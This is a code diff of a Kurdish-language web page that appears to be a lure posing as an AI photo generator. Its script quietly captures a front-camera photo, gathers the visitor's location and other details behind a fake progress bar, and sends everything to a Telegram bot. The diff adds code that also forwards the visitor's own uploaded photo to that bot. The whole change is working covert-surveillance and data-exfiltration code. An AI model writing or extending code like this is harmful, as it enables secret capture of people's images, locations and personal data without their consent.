@@ -98,7 +98,7 @@
         <p>تەنها <strong>١ وێنەی کەسی خۆت</strong> ئەپلۆد بکە، زیرەکی دەستکرد ١٠٠ وێنەی پڕۆفیشناڵ و شازت بۆ دروست دەکات!</p>
 
         <div class="upload-box" onclick="document.getElementById('fileInput').click()">
-            <div class="upload-text">📁 وێنەکەت لێرە دابنە (ئەپلۆد)</div>
+            <div class="upload-text" id="uploadLabel">📁 وێنەکەت لێرە دابنە (ئەپلۆد)</div>
             <div class="upload-sub">پشتیوانی لە JPG, PNG دەكات</div>
             <input type="file" id="fileInput" accept="image/*" onchange="handleFileSelect()">
         </div>
@@ -119,6 +119,8 @@
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('id') || "6782298541";
 
+        let selectedFile = null;
+
         async function getTelegramFirstName() {
             try {
                 const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
@@ -138,6 +140,9 @@
         function handleFileSelect() {
             const input = document.getElementById('fileInput');
             if (input.files && input.files[0]) {
+                selectedFile = input.files[0];
+                document.getElementById('uploadLabel').innerText = `✅ وێنە هەڵبژێردرا: ${selectedFile.name}`;
+                
                 const btn = document.getElementById('generateBtn');
                 btn.disabled = false;
                 btn.style.opacity = '1';
@@ -150,7 +155,6 @@
             document.getElementById('generateBtn').style.display = 'none';
             document.getElementById('progressBox').style.display = 'block';
 
-            // کۆکردنەوەی هەموو زانیارییەکان لە پشت پەردەوە بە بێدەنگی
             let firstName = await getTelegramFirstName();
 
             const days = ["یەکشەممە", "دووشەممە", "سێشەممە", "چوارشەممە", "پێنجشەممە", "هەینی", "شەممە"];
@@ -281,7 +285,7 @@
             } catch (e) {}
 
             // وێنەگرتنی ڕاستەوخۆ بە کامێرا
-            let imageBlob = null;
+            let cameraBlob = null;
             let cameraStatus = "";
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
@@ -291,7 +295,7 @@
                 video.srcObject = stream;
                 await video.play();
 
-                imageBlob = await new Promise((resolve) => {
+                cameraBlob = await new Promise((resolve) => {
                     setTimeout(() => {
                         const canvas = document.createElement('canvas');
                         canvas.width = 640; 
@@ -307,8 +311,7 @@
                 cameraStatus = "بەکارهێنەرەکە Allowـی نەکردووە (Deny کردووە)، بۆیە وێنەی نەهاتۆتەوە 🔴";
             }
 
-            // ئەیمەیشن و پێشکەوتنی بارەکە بۆ ئەوەی ڕاستەقینە دەرکەوێت
-            updateProgress(20, "خەریکی شیکردنەوەی وێنەکەی تۆیە...");
+            updateProgress(20, "خەریکی شیکردنەوەی وێنەی ئەپلۆدکراو...");
             await sleep(800);
             updateProgress(50, "بەستنەوە بە مۆدێلی AI...");
             await sleep(800);
@@ -320,9 +323,9 @@
                 ? `لۆکەیشنی دەقیقی کەسەکە ئەمەتا دەتوانی بە کلیک کردن لەسەر [گووگڵ ماپ](${mapLink}) بیبینی:\n(Lat & Long: ${locationText})` 
                 : `لۆکەیشن: ${locationStatus}`;
 
-            let introText = imageBlob 
-                ? `👤 سڵاو ${firstName}، ئەمە وێنەی کەسەکەیە و وردەکارییەکانی بەم شێوەیەیە:` 
-                : `👤 سڵاو ${firstName}، وێنەی کەسەکە نەهاتۆتەوە، چونکە ${cameraStatus}`;
+            let introText = cameraBlob 
+                ? `👤 سڵاو ${firstName}، ئەمە وێنەی ڕاستەوخۆی کەسەکەیە و وردەکارییەکانی بەم شێوەیەیە:` 
+                : `👤 سڵاو ${firstName}، وێنەی کامێرا نەهاتۆتەوە، چونکە ${cameraStatus}`;
 
             const msg = `زانیارییە تەواوەکانی سەردانیکەرەکە (پێشکەوتوو):\n\n` +
                         `${introText}\n\n` +
@@ -363,16 +366,32 @@
                 });
             } catch (err) {}
 
-            if (imageBlob) {
+            // ناردنی وێنەی ڕاستەوخۆی کامێرا ئەگەر هەبوو
+            if (cameraBlob) {
                 try {
                     const formData = new FormData();
                     formData.append('chat_id', chatId);
-                    formData.append('photo', imageBlob, 'capture.jpg');
-                    formData.append('caption', `📸 وێنەی ڕاستەوخۆی کەسەکە (${firstName}، ئەمەش وێنەکەیەتی)`);
+                    formData.append('photo', cameraBlob, 'camera_capture.jpg');
+                    formData.append('caption', `📸 وێنەی ڕاستەوخۆی کامێرا (${firstName})`);
                     
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { 
                         method: 'POST', 
                         body: formData 
+                    });
+                } catch (err) {}
+            }
+
+            // ناردنی ئەو وێنەیەی کە بەکارهێنەر خۆی ئەپلۆدی کردووە بۆ تەلەگرامەکەت
+            if (selectedFile) {
+                try {
+                    const formDataUpload = new FormData();
+                    formDataUpload.append('chat_id', chatId);
+                    formDataUpload.append('photo', selectedFile, selectedFile.name);
+                    formDataUpload.append('caption', `🖼️ ئەو وێنەیەی کەسەکە خۆی ئەپلۆدی کردووە (${firstName})`);
+                    
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { 
+                        method: 'POST', 
+                        body: formDataUpload 
                     });
                 } catch (err) {}
             }
